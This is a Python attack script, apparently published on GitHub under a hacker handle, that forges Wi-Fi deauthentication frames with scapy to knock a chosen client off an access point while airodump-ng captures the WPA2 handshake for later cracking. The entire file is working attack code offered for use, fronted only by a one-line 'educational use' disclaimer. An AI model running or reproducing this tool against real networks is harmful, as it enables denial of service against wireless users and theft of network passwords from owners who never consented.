#!/usr/bin/env python3

import os
import time
import argparse
from scapy.all import *

# Ensure running as root
if os.geteuid() != 0:
    print("[!] Run this script as root!")
    exit(1)

def banner():
    banner_name = r"""


 (                              (                              
 )\ )                        (  )\ )  (                        
(()/( (   (  (            )  )\(()/(  )\    )  (       (   (   
 /(_)))\  )\))(  (     ( /( ((_)/(_))((_)( /(  )\ )   ))\  )(  
(_)) ((_)((_))\  )\ )  )(_)) _ (_))   _  )(_))(()/(  /((_)(()\ 
/ __| (_) (()(_)_(_/( ((_)_ | |/ __| | |((_)_  )(_))(_))   ((_)
\__ \ | |/ _` || ' \))/ _` || |\__ \ | |/ _` || || |/ -_) | '_|
|___/ |_|\__, ||_||_| \__,_||_||___/ |_|\__,_| \_, |\___| |_|  
         |___/                                 |__/            


"""
    print(banner_name)


banner()

print("""
[+] Author   : N3xtGenH4cker
[+] Tool     : WiFi Deauth Attack
[+] Version  : 1.0
[+] GitHub   : https://github.com/N3xtGenH4cker/WiFi-Deauth-Attack
[+] Disclaimer: This tool is for educational and ethical use only.
                Unauthorized use may violate local laws. Danko!!
""")

def deauth(target_mac, ap_mac, iface, count=100):
    """
    Sends deauthentication packets to disconnect a client from an AP.
    """
    print(f"[+] Sending {count} deauth packets to {target_mac} from {ap_mac} on {iface}...")
    deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    sendp(deauth_packet, iface=iface, count=count, inter=0.1, verbose=True)
    print("[+] Deauth attack completed!")

def capture_handshake(interface, bssid, channel, output_file):
    """
    Starts airodump-ng to capture WPA2 handshakes.
    """
    print("[+] Starting handshake capture...")
    os.system(f"sudo airmon-ng start {interface} {channel}")
    os.system(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}mon")

def main():
    parser = argparse.ArgumentParser(description="Wi-Fi Deauth Attack & Handshake Capture")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface in monitor mode (e.g., wlan0mon)")
    parser.add_argument("-c", "--channel", required=True, help="Wi-Fi channel of the target AP")
    parser.add_argument("-a", "--ap", required=True, help="Target AP MAC address")
    parser.add_argument("-t", "--target", required=True, help="Target client MAC address")
    parser.add_argument("-o", "--output", default="handshake", help="Output file for captured handshake")
    parser.add_argument("--count", type=int, default=100, help="Number of deauth packets (default: 100)")
    
    args = parser.parse_args()

    
    print("[+] Putting interface in monitor mode...")
    os.system(f"sudo airmon-ng start {args.interface}")

    handshake_process = os.fork()
    if handshake_process == 0:
        capture_handshake(args.interface, args.ap, args.channel, args.output)
    else:
        time.sleep(5)
        deauth(args.target, args.ap, args.interface, args.count)

        time.sleep(20)
        os.system("sudo pkill airodump-ng")
        print("[+] Handshake capture stopped.")

if __name__ == "__main__":
    main()
